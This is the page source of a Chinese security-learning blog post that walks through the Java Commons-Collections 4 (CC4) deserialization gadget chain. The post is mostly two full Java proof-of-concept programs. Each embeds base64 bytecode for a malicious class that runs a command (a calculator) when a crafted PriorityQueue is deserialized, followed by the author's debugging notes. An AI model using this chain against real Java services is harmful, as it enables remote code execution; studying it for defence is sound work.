@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="上面 CC2 说了因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，其实cc链4就是cc2链中InvokerTransformer替换为 InstantiateTransformer，看起来有点类似cc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java_cc链4">
+<meta property="og:url" content="http://example.com/2023/07/19/java-cc%E9%93%BE4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="上面 CC2 说了因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，其实cc链4就是cc2链中InvokerTransformer替换为 InstantiateTransformer，看起来有点类似cc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc41.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc42.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc43.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc44.bmp">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc45.bmp">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc46.bmp">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc47.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc48.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc49.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc410.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc411.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc412.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc413.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/cc414.png">
+<meta property="article:published_time" content="2023-07-19T03:19:21.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:44:26.256Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/cc41.png">
+
+<link rel="canonical" href="http://example.com/2023/07/19/java-cc%E9%93%BE4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>java_cc链4 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/19/java-cc%E9%93%BE4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java_cc链4
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-19 11:19:21" itemprop="dateCreated datePublished" datetime="2023-07-19T11:19:21+08:00">2023-07-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:44:26" itemprop="dateModified" datetime="2025-05-25T11:44:26+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上面 CC2 说了因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，其实cc链4就是cc2链中InvokerTransformer替换为 InstantiateTransformer，看起来有点类似cc2与cc3的结合</p>
+<span id="more"></span>
+
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>apache commons collection-4.0</li>
+<li>&lt; jdk8u71</li>
+</ul>
+<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                        -&gt;ConstantTransformer.transform()</span><br><span class="line">                                    -&gt;InstantiateTransformer.transform()</span><br><span class="line">                             -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                 -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                        -&gt;…………</span><br></pre></td></tr></table></figure>
+
+<h2 id="尝试根据cc2链进行修改"><a href="#尝试根据cc2链进行修改" class="headerlink" title="尝试根据cc2链进行修改"></a>尝试根据cc2链进行修改</h2><p>我首先修改成了这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc4;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line">import com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc4 &#123;</span><br><span class="line">    public static void main(String[] args) throws Base64DecodingException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码</span><br><span class="line">        byte[] bytes = Base64.decode(&quot;yv66vgAAADQAMgoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24KABMAFgwAFwAGAQAPcHJpbnRTdGFja1RyYWNlBwAZAQAfbWFpbi9qYXZhL2NjMi9UZXN0VGVtcGxhdGVzSW1wbAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAIUxtYWluL2phdmEvY2MyL1Rlc3RUZW1wbGF0ZXNJbXBsOwEADVN0YWNrTWFwVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEAIQAYAAIAAAAAAAMAAQAFAAYAAQAaAAAAfAACAAIAAAAWKrcAAbgABxINtgAPV6cACEwrtgAVsQABAAQADQAQABMAAwAbAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASABwAAAAWAAIAEQAEAB0AHgABAAAAFgAfACAAAAAhAAAAEAAC/wAQAAEHABgAAQcAEwQAAQAiACMAAgAaAAAAPwAAAAMAAAABsQAAAAIAGwAAAAYAAQAAABYAHAAAACAAAwAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAmACcAAgAoAAAABAABACkAAQAiACsAAgAaAAAASQAAAAQAAAABsQAAAAIAGwAAAAYAAQAAABoAHAAAACoABAAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAsAC0AAgAAAAEALgAvAAMAKAAAAAQAAQApAAEAMAAAAAIAMQ==&quot;);</span><br><span class="line">        //反射创建TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);</span><br><span class="line">        Object TemplatesImpl_instance = constructor.newInstance();</span><br><span class="line">        //将恶意类的字节码设置给_bytecodes属性</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , new byte[][]&#123;bytes&#125;);</span><br><span class="line">        //设置属性_name为恶意类名</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);</span><br><span class="line"></span><br><span class="line">        //传递给TransformingComparator</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;aClass&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator((org.apache.commons.collections4.Transformer) chainedTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(1);</span><br><span class="line"></span><br><span class="line">        //设置comparator属性</span><br><span class="line">        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line">        //设置queue属性</span><br><span class="line">        field=queue.getClass().getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        //数组中必须添加2个元素</span><br><span class="line">        Object[] objects = new Object[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object object = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行一下，果然报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: org.apache.commons.collections.functors.ChainedTransformer cannot be cast to org.apache.commons.collections4.Transformer</span><br></pre></td></tr></table></figure>
+
+<p>显示chainedTransform类无法转化为Transform类 ，后面发现是导包的问题，将网上的导包复制进去就没有报错了，仔细比对一下，发现应该都是commons.collections4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc4;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;//</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;//</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line">import org.apache.commons.collections4.Transformer;//</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;//</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;//</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;//</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;//</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;//</span><br><span class="line">import java.io.*;//</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;//</span><br><span class="line">import java.lang.reflect.InvocationTargetException;//</span><br><span class="line">import java.util.PriorityQueue;//</span><br><span class="line"></span><br><span class="line">public class cc4 &#123;</span><br><span class="line">    public static void main(String[] args) throws Base64DecodingException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, InvocationTargetException, IOException &#123;</span><br><span class="line">        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码</span><br><span class="line">        byte[] bytes = Base64.decode(&quot;yv66vgAAADQAMgoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24KABMAFgwAFwAGAQAPcHJpbnRTdGFja1RyYWNlBwAZAQAfbWFpbi9qYXZhL2NjMi9UZXN0VGVtcGxhdGVzSW1wbAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAIUxtYWluL2phdmEvY2MyL1Rlc3RUZW1wbGF0ZXNJbXBsOwEADVN0YWNrTWFwVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEAIQAYAAIAAAAAAAMAAQAFAAYAAQAaAAAAfAACAAIAAAAWKrcAAbgABxINtgAPV6cACEwrtgAVsQABAAQADQAQABMAAwAbAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASABwAAAAWAAIAEQAEAB0AHgABAAAAFgAfACAAAAAhAAAAEAAC/wAQAAEHABgAAQcAEwQAAQAiACMAAgAaAAAAPwAAAAMAAAABsQAAAAIAGwAAAAYAAQAAABYAHAAAACAAAwAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAmACcAAgAoAAAABAABACkAAQAiACsAAgAaAAAASQAAAAQAAAABsQAAAAIAGwAAAAYAAQAAABoAHAAAACoABAAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAsAC0AAgAAAAEALgAvAAMAKAAAAAQAAQApAAEAMAAAAAIAMQ==&quot;);</span><br><span class="line">        //反射创建TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);</span><br><span class="line">        Object TemplatesImpl_instance = constructor.newInstance();</span><br><span class="line">        //将恶意类的字节码设置给_bytecodes属性</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , new byte[][]&#123;bytes&#125;);</span><br><span class="line">        //设置属性_name为恶意类名</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);</span><br><span class="line"></span><br><span class="line">        //传递给TransformingComparator</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;aClass&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(1);</span><br><span class="line"></span><br><span class="line">        //设置comparator属性</span><br><span class="line">        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line">        //设置queue属性</span><br><span class="line">        field=queue.getClass().getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        //数组中必须添加2个元素</span><br><span class="line">        Object[] objects = new Object[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object object = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行一下，新的问题又来了，虽说有个异常，但按理来说应该有计算器弹出，调试一下，看看哪里错了</p>
+<p>调试过后发现在InstantiateTransformer类的transform方法出现了异常，然后直接结束进程了</p>
+<p><img src="https://ilikeoyt.github.io/image/cc41.png" alt="img"></p>
+<p>显示参数类型不匹配</p>
+<p><img src="https://ilikeoyt.github.io/image/cc42.png" alt="img"></p>
+<p>那就在InstantiateTransformer赋值的地方找一下问题在哪？注意看这句代码：new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{aClass})，aClass现在是一个Class对象，而InstantiateTransformer类需要的是一个Object类，所以应该将aClass换成TemplatesImpl_instance，运行一下，弹出计算器。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc43.png" alt="img"></p>
